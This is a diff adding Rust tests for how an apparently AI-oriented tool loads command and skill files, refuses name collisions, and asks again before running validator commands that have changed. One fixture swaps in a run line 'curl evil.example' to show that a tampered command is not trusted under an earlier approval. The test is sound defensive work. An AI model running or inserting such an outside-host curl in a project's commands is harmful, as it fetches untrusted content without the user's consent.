@@ -5,7 +5,7 @@
 //!
 //! [ADR-0015]: https://100monkeys-ai.cortex.page/zaru/p/adrs/0015-commands-and-extensibility
 
-use crate::commands::document::{Command, CommandRefused, Source};
+use crate::commands::document::{Command, CommandRefused, Kind, Source};
 use crate::commands::{Admissions, Offer, load_from};
 use crate::commands::{date, fixtures, front_matter, placeholder};
 
@@ -173,6 +173,7 @@ fn the_attribution_line_is_the_records_own_shape() {
     let project = crate::commands::document::Expanded {
         name: "deploy-check".to_owned(),
         source: Source::Project,
+        kind: crate::commands::Kind::Command,
         admitted: Some("2026-08-19".to_owned()),
         typed: "/deploy-check main".to_owned(),
         task: "check main".to_owned(),
@@ -632,6 +633,451 @@ fn an_absent_admissions_file_is_no_admissions_and_a_fragment_is_not_a_line() {
             .len(),
         1,
         "the line in flight when a machine lost power is never counted"
+    );
+}
+
+/// ADR-0015 D5's skill is named by the stem **before** `.skill`, and that
+/// spelling had to be claimed rather than added.
+///
+/// Measured from the release binary at `6bdf080` before this landing:
+/// `COMMAND_EXTENSION` is `md`, so the command loader already read
+/// `triage.skill.md` and called the command `triage.skill` — it was admitted
+/// under that name and shown in the picker. So the rule is that the stem
+/// decides the name *and* the kind.
+///
+/// **The mutant:** `skill::of_stem` returning the whole stem as the name
+/// reddens the first assertion with `triage.skill`, which is exactly what the
+/// binary did before this module.
+#[test]
+fn a_skill_is_named_by_the_stem_before_dot_skill() {
+    let scratch = fixtures::Scratch::new();
+    scratch.user_command(
+        "triage.skill",
+        &fixtures::file("description = \"triage one issue\"\n", "Triage $1.\n"),
+    );
+    scratch.user_command("deploy-check", &fixtures::file("", "Check $1.\n"));
+    let admissions = Admissions::under(&scratch.home());
+    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());
+
+    assert!(
+        loaded.refusals.is_empty(),
+        "nothing is refused: {:?}",
+        loaded
+            .refusals
+            .iter()
+            .map(ToString::to_string)
+            .collect::<Vec<_>>()
+    );
+    let skill = loaded.named("triage").expect("the skill loads as `triage`");
+    assert_eq!(skill.kind(), Kind::Skill);
+    assert_eq!(skill.slash(), "/triage");
+    assert_eq!(skill.description(), Some("triage one issue"));
+    // The accepting sibling: a plain `<name>.md` is still a command.
+    let command = loaded.named("deploy-check").expect("the command loads");
+    assert_eq!(command.kind(), Kind::Command);
+    assert!(
+        loaded.named("triage.skill").is_none(),
+        "the name is the stem before `.skill`, and nothing answers to the stem itself"
+    );
+}
+
+/// `<name>.md` and `<name>.skill.md` in one directory claim one name, and
+/// **neither loads**.
+///
+/// Which of them won would be behaviour that depends on the order a directory
+/// was read in, which is D2's own reason for refusing a shadowing name one
+/// paragraph above.
+///
+/// **The mutant:** `refuse_a_collision` keeping the first of the two reddens
+/// the second assertion, and a project could change which file runs by
+/// renaming neither of them.
+#[test]
+fn a_command_and_a_skill_of_one_name_are_both_refused_naming_both_files() {
+    let scratch = fixtures::Scratch::new();
+    scratch.user_command("deploy-check", &fixtures::file("", "The command.\n"));
+    scratch.user_command("deploy-check.skill", &fixtures::file("", "The skill.\n"));
+    scratch.user_command("survivor", &fixtures::file("", "Untouched.\n"));
+    let admissions = Admissions::under(&scratch.home());
+    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());
+
+    assert!(
+        loaded.named("deploy-check").is_none(),
+        "neither file loads, because which one won would depend on load order"
+    );
+    assert_eq!(loaded.commands.len(), 1, "and the neighbour still loads");
+    assert!(loaded.named("survivor").is_some());
+    let said = loaded
+        .refusals
+        .iter()
+        .map(ToString::to_string)
+        .collect::<Vec<_>>()
+        .join("\n");
+    assert!(
+        said.contains("deploy-check.md") && said.contains("deploy-check.skill.md"),
+        "the refusal names both files: {said}"
+    );
+    assert!(
+        said.contains("`deploy-check`"),
+        "and the name they both claim: {said}"
+    );
+}
+
+/// Clause 5 reaches a skill by its **name**, over both of a namespace's
+/// spellings.
+///
+/// A skill and a command share one namespace, and D2's reason — behaviour
+/// that depends on load order — does not care which kind shadowed.
+///
+/// **The mutant:** applying `shadowed` to the file stem rather than to the
+/// name leaves `session.skill` colliding with nothing and reddens the first
+/// two arms.
+#[test]
+fn a_skill_named_for_a_built_in_is_refused_at_load_over_both_spellings() {
+    let scratch = fixtures::Scratch::new();
+    for name in [
+        "session.skill",
+        "sessions.skill",
+        "exit.skill",
+        "helper.skill",
+    ] {
+        scratch.user_command(name, &fixtures::file("", "A body.\n"));
+    }
+    let admissions = Admissions::under(&scratch.home());
+    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());
+
+    let said = loaded
+        .refusals
+        .iter()
+        .map(ToString::to_string)
+        .collect::<Vec<_>>()
+        .join("\n");
+    for (file, spelling) in [
+        ("session.skill.md", "`/session`"),
+        ("sessions.skill.md", "`zaru sessions`"),
+        ("exit.skill.md", "`/exit`"),
+    ] {
+        let line = said
+            .lines()
+            .find(|line| line.contains(file))
+            .unwrap_or_else(|| panic!("{file} is refused: {said}"));
+        assert!(
+            line.contains(spelling),
+            "the refusal names the built-in spelling it collided with: {line}"
+        );
+    }
+    // The accepting sibling: a name that is not a namespace loads as a skill.
+    assert_eq!(
+        loaded.named("helper").map(Command::kind),
+        Some(Kind::Skill),
+        "the rule is not a blanket refusal of skills"
+    );
+}
+
+/// D5's `expect` clauses are read by **ADR-0009's own reader**, in that
+/// record's own `[[validator]]` spelling, and a malformed block is refused in
+/// that reader's words with this file's path in front of them.
+///
+/// **The mutant:** a second parser in `commands::skill` — or
+/// `validators_of` returning `Ok(Vec::new())` for a present key — reddens the
+/// first assertion, and D5 would be a filename with nothing behind it.
+#[test]
+fn a_skills_validator_block_is_read_by_the_manifests_own_parser() {
+    let scratch = fixtures::Scratch::new();
+    scratch.user_command(
+        "triage.skill",
+        &fixtures::file(
+            "description = \"triage one issue\"\n\n[[validator]]\nname = \"says-triaged\"\nrun = \
+             \"printf triaged\"\nexpect = { matches = \"triaged\" }\n\n[[validator]]\nname = \
+             \"builds\"\nrun = \"true\"\nexpect = \"exit-zero\"\nafter = [\"says-triaged\"]\n",
+            "Triage $1.\n",
+        ),
+    );
+    scratch.user_command(
+        "broken.skill",
+        &fixtures::file(
+            "[[validator]]\nname = \"x\"\nrun = \"true\"\nexpect = \"exit-nine\"\n",
+            "Body.\n",
+        ),
+    );
+    let admissions = Admissions::under(&scratch.home());
+    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());
+
+    let declared = loaded.validators_of("triage");
+    assert_eq!(
+        declared.len(),
+        2,
+        "both blocks are read, in declaration order"
+    );
+    assert_eq!(declared[0].name.as_str(), "says-triaged");
+    assert_eq!(declared[0].run.as_str(), "printf triaged");
+    assert_eq!(declared[1].after.len(), 1, "`after` travels with them");
+    assert_eq!(declared[1].after[0].as_str(), "says-triaged");
+
+    let refusal = loaded
+        .refusals
+        .iter()
+        .find(|refusal| refusal.path().ends_with("broken.skill.md"))
+        .unwrap_or_else(|| panic!("the malformed block is refused"))
+        .to_string();
+    assert!(
+        refusal.contains("broken.skill.md"),
+        "the refusal names the file, which the manifest's reader does not: {refusal}"
+    );
+    assert!(
+        refusal.contains("exit-nine"),
+        "and it is the manifest reader's own words: {refusal}"
+    );
+    assert!(
+        loaded.named("broken").is_none(),
+        "a file whose validators do not read does not load"
+    );
+}
+
+/// A `[[validator]]` in a `<name>.md` is a person who meant to write a skill,
+/// and the remedy is the filename rather than deleting what they wrote.
+///
+/// This is the state measured from the release binary at `6bdf080`, where the
+/// same file was refused as `declares `expect`, which a command file has no
+/// key for; the nearest is `name`` — a refusal whose reader could not act.
+///
+/// **The mutant:** dropping the `Kind::Command` guard so the key walk answers
+/// instead reddens the assertion that the refusal names the skill spelling.
+#[test]
+fn a_validator_in_a_command_file_names_the_skill_it_would_have_to_be() {
+    let scratch = fixtures::Scratch::new();
+    scratch.user_command(
+        "triage",
+        &fixtures::file(
+            "[[validator]]\nname = \"x\"\nrun = \"true\"\nexpect = \"exit-zero\"\n",
+            "Body.\n",
+        ),
+    );
+    let admissions = Admissions::under(&scratch.home());
+    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());
+
+    let refusal = loaded
+        .refusals
+        .first()
+        .expect("the file is refused")
+        .to_string();
+    assert!(
+        refusal.contains("triage.skill.md"),
+        "the refusal names what to rename it to: {refusal}"
+    );
+    assert!(loaded.named("triage").is_none());
+}
+
+/// A skill has three keys and a command has two; a fourth is refused naming
+/// the nearest of that kind's own.
+///
+/// **The mutant:** `Kind::keys` answering `Kind::Command`'s set for both
+/// reddens the first assertion, and `[[validator]]` would be an unknown key
+/// in the file that is for it.
+#[test]
+fn a_skills_schema_has_three_keys_and_a_fourth_is_still_refused() {
+    let scratch = fixtures::Scratch::new();
+    scratch.user_command(
+        "ok.skill",
+        &fixtures::file(
+            "description = \"d\"\nname = \"ok\"\n\n[[validator]]\nname = \"v\"\nrun = \
+             \"true\"\nexpect = \"exit-zero\"\n",
+            "Body.\n",
+        ),
+    );
+    scratch.user_command(
+        "extra.skill",
+        &fixtures::file("descriptoin = \"d\"\n", "Body.\n"),
+    );
+    let admissions = Admissions::under(&scratch.home());
+    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());
+
+    assert_eq!(
+        loaded.validators_of("ok").len(),
+        1,
+        "`validator` is a key a skill has: {:?}",
+        loaded
+            .refusals
+            .iter()
+            .map(ToString::to_string)
+            .collect::<Vec<_>>()
+    );
+    let refusal = loaded
+        .refusals
+        .iter()
+        .find(|refusal| refusal.path().ends_with("extra.skill.md"))
+        .expect("a fourth key is refused")
+        .to_string();
+    assert!(
+        refusal.contains("`description`"),
+        "naming the nearest of the kind's own keys: {refusal}"
+    );
+}
+
+/// D5's second sentence, built rather than written: "one without runs as
+/// instructions". A skill with no `[[validator]]` is a command with a
+/// different word in its attribution and nothing else.
+///
+/// **The mutant:** `origin_words` ignoring the kind reddens the first two
+/// assertions, and D6's line would not say which kind contributed.
+#[test]
+fn a_skill_without_validators_is_a_command_with_a_different_word() {
+    let scratch = fixtures::Scratch::new();
+    scratch.user_command("plain.skill", &fixtures::file("", "Just instructions.\n"));
+    let admissions = Admissions::under(&scratch.home());
+    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());
+
+    let skill = loaded.named("plain").expect("it loads");
+    assert_eq!(skill.origin(), "user skill");
+    assert_eq!(
+        crate::commands::origin_words(Source::Project, Kind::Skill),
+        "project skill"
+    );
+    assert_eq!(
+        crate::commands::origin_words(Source::Project, Kind::Command),
+        "project",
+        "a command's line is unchanged, which is what makes this additive"
+    );
+    assert!(
+        skill.validators().is_empty(),
+        "and it declares nothing, so it runs as instructions"
+    );
+    let expanded = loaded
+        .expand("plain", "/plain now")
+        .expect("it expands like any other");
+    assert_eq!(expanded.attribution(), "/plain (user skill)");
+    assert_eq!(expanded.task, "Just instructions.\n");
+}
+
+/// D4's question shows each skill's `run` lines **verbatim**, so the person
+/// admits the commands as well as the instructions.
+///
+/// A validator's `run` is the one thing in either file that is actually
+/// executed, and D4's own words are that "the harness reports what the
+/// project offers".
+///
+/// **The mutant:** `offered_rows` returning the slash alone reddens the run
+/// assertion, and the gate would be nominal rather than informed.
+#[test]
+fn the_questions_rows_carry_each_run_line_verbatim() {
+    let scratch = fixtures::Scratch::new();
+    scratch.project_command(
+        "triage.skill",
+        &fixtures::file(
+            "[[validator]]\nname = \"v\"\nrun = \"cargo test --all\"\nexpect = \"exit-zero\"\n",
+            "Triage $1.\n",
+        ),
+    );
+    scratch.project_command("plain", &fixtures::file("", "A command.\n"));
+    let admissions = Admissions::under(&scratch.home());
+    let loaded = load_from(None, Some(&scratch.project()), &admissions, ceiling());
+
+    let rows: Vec<String> = loaded
+        .offer
+        .pending()
+        .iter()
+        .flat_map(Command::offered_rows)
+        .collect();
+    assert!(
+        rows.contains(&"/triage (skill)".to_owned()),
+        "the kind is visible in the rows: {rows:?}"
+    );
+    assert!(
+        rows.contains(&"  cargo test --all".to_owned()),
+        "and the run line is there, verbatim: {rows:?}"
+    );
+    assert!(
+        rows.contains(&"/plain".to_owned()),
+        "a command's row is unchanged: {rows:?}"
+    );
+}
+
+/// A rewritten `run` line asks again, which the body alone did not cover.
+///
+/// The admission record carries the **whole file** since 2026-09-15, front
+/// matter included. Before that it carried the body, which is the text after
+/// the front matter — so a `[[validator]]` rewritten by tomorrow's `git pull`
+/// would have run under yesterday's answer.
+///
+/// **The mutant:** `Admission::file` holding `command.body()` again reddens
+/// the second assertion, and the gate would be about the prose rather than
+/// about the command that runs.
+#[test]
+fn a_rewritten_run_line_asks_again_and_so_does_a_rewritten_description() {
+    let scratch = fixtures::Scratch::new();
+    let with = |run: &str, description: &str, body: &str| {
+        fixtures::file(
+            &format!(
+                "description = \"{description}\"\n\n[[validator]]\nname = \"v\"\nrun = \
+                 \"{run}\"\nexpect = \"exit-zero\"\n"
+            ),
+            body,
+        )
+    };
+    scratch.project_command("triage.skill", &with("true", "d", "Triage $1.\n"));
+    let admissions = Admissions::under(&scratch.home());
+    let first = load_from(None, Some(&scratch.project()), &admissions, ceiling());
+    admissions
+        .admit(&scratch.project(), first.offer.pending(), "2026-09-15")
+        .expect("the admission is written");
+    assert!(
+        load_from(None, Some(&scratch.project()), &admissions, ceiling())
+            .named("triage")
+            .is_some(),
+        "an unchanged file loads, which is ADR-0002 D1"
+    );
+
+    scratch.project_command(
+        "triage.skill",
+        &with("curl evil.example", "d", "Triage $1.\n"),
+    );
+    assert!(
+        load_from(None, Some(&scratch.project()), &admissions, ceiling())
+            .named("triage")
+            .is_none(),
+        "a rewritten `run` line asks again"
+    );
+
+    scratch.project_command("triage.skill", &with("true", "other", "Triage $1.\n"));
+    assert!(
+        load_from(None, Some(&scratch.project()), &admissions, ceiling())
+            .named("triage")
+            .is_none(),
+        "and so does a rewritten `description`, which is in the front matter too"
+    );
+}
+
+/// An admission recorded before 2026-09-15 carries `body` and no `file`, so
+/// it asks once more rather than failing to parse.
+///
+/// That is the intended cost of the change and it is paid once per project.
+///
+/// **The mutant:** dropping `#[serde(default)]` from `Admission::file` makes
+/// the older line a `Malformed` refusal, which reddens the first assertion
+/// and turns a re-ask into an error about the user's own file.
+#[test]
+fn an_admission_written_before_the_whole_file_rule_asks_once_more() {
+    let scratch = fixtures::Scratch::new();
+    scratch.project_command("deploy-check", &fixtures::file("", "Check $1.\n"));
+    let admissions = Admissions::under(&scratch.home());
+    std::fs::create_dir_all(scratch.home()).expect("staging: the home");
+    let older = format!(
+        "{{\"directory\":{},\"name\":\"deploy-check\",\"admitted\":\"2026-09-14\",\"body\":\"Check \
+         $1.\\n\"}}\n",
+        serde_json::to_string(&scratch.project()).expect("the path renders")
+    );
+    std::fs::write(admissions.path(), older).expect("the older line is written");
+
+    let entries = admissions
+        .entries()
+        .expect("an older line parses rather than refusing");
+    assert_eq!(entries.len(), 1);
+    assert_eq!(entries[0].file, "", "with no file recorded");
+    assert!(
+        matches!(
+            load_from(None, Some(&scratch.project()), &admissions, ceiling()).offer,
+            Offer::Pending(_)
+        ),
+        "so the project asks once more"
     );
 }
 
